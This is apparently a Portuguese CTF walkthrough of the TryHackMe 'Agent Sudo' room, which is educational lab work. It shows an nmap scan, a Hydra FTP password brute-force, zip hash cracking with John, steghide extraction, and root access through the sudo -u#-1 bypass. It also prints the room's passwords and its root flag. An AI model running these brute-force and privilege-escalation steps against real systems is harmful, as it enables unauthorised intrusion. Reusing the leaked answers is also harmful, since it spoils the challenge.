---
title: TryHackMe - Agent Sudo
author: Mithr4nd1r
date: 2022-08-18 00:00:00 -0300
categories: [TryHackMe, Agent Sudo]
tags: [writeup, walkthrough, tryhackme, thm, tutorial, hacking, pentest, ctf, capture, flag]
pin: true
---

Dificuldade | Opinião | 📅 Início | 📅 Concluída
:--:|:--:|:--:|:--:
Fácil|Médio|17 de Agosto de 2022|18 de Agosto de 2022

## Escaneamento
- Comando: `nmap -sSV -v 10.10.182.39 -Pn -p 21,22,8`
```console
Nmap scan report for 10.10.182.39
Host is up (0.37s latency).
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumeração

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled.png)

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%201.png)

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%202.png)

```bash
┌──(root💀tenas)-[/home/tenas]
└─# hydra -l chris -P /home/tenas/Downloads/rockyou.txt 10.10.182.39 ftp                                              130 ⨯
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-17 21:53:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.182.39:21/
[STATUS] 256.00 tries/min, 256 tries in 00:01h, 14344143 to do in 933:52h, 16 active
[21][ftp] host: 10.10.182.39   login: **chris**   password: **crystal**
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-17 21:54:58
```

```bash
┌──(root💀tenas)-[/home/tenas]
└─# ftp 10.10.182.39                    
Connected to 10.10.182.39.
220 (vsFTPd 3.0.3)
Name (10.10.182.39:tenas): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||9689|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||35385|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |*******************************************************************************|   217        2.08 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (0.68 KiB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||26681|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |*******************************************************************************| 33143       52.11 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (36.22 KiB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||65384|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |*******************************************************************************| 34842       58.62 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (39.86 KiB/s)
ftp> exit
221 Goodbye.
```

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%203.png)

[https://book.hacktricks.xyz/crypto-and-stego/stego-tricks](https://book.hacktricks.xyz/crypto-and-stego/stego-tricks)

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%204.png)

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%205.png)

```bash
┌──(root💀tenas)-[/home/…/gciber/extra/vulnhub/agent]
└─# cat _cutie.png.extracted 
cat: _cutie.png.extracted: É um diretório
                                                                                                                            
┌──(root💀tenas)-[/home/…/gciber/extra/vulnhub/agent]
└─# cd _cutie.png.extracted                                                                                             1 ⨯
                                                                                                                            
┌──(root💀tenas)-[/home/…/extra/vulnhub/agent/_cutie.png.extracted]
└─# ls
365  365.zlib  8702.zip  To_agentR.txt
                                                                                                                            
┌──(root💀tenas)-[/home/…/extra/vulnhub/agent/_cutie.png.extracted]
└─# cat To_agentR.txt
```

```bash
┌──(root💀tenas)-[/home/…/extra/vulnhub/agent/_cutie.png.extracted]
└─# zip2john 8702.zip                        
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
                                                                                                                            
┌──(root💀tenas)-[/home/…/extra/vulnhub/agent/_cutie.png.extracted]
└─# zip2john 8702.zip > zip_hash
                                                                                                                            
┌──(root💀tenas)-[/home/…/extra/vulnhub/agent/_cutie.png.extracted]
└─# jumbo zip_hash     
Warning: detected hash type "ZIP", but the string is also recognized as "ZIP-opencl"
Use the "--format=ZIP-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/src/john/run/password.lst
**alien**            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2022-08-17 22:45) 2.222g/s 119177p/s 119177c/s 119177C/s 123456..faithfaith
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%206.png)

```bash
┌──(root💀tenas)-[/home/…/extra/vulnhub/agent/_cutie.png.extracted]
└─# echo QXJlYTUx | base64 -d         
Area51
```

```bash
┌──(root💀tenas)-[/home/…/gciber/extra/vulnhub/agent]
└─# ls   
cute-alien.jpg  cutie.png  _cutie.png.extracted  To_agentJ.txt
                                                                                                                            
┌──(root💀tenas)-[/home/…/gciber/extra/vulnhub/agent]
└─# steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
                                                                                                                            
┌──(root💀tenas)-[/home/…/gciber/extra/vulnhub/agent]
└─# cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

pass=hackerrules!

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%207.png)

[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

![Untitled](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%208.png)

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root#
```

[](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%20d7f9cf84b9f747328c6e4b54b4b9a462.md)

[](TryHackMe%20-%20Agent%20Sudo%20551ca5d7836b45c19d28f8416830c7da/Untitled%20f549f92391224d1b98e53791b9438e48.md)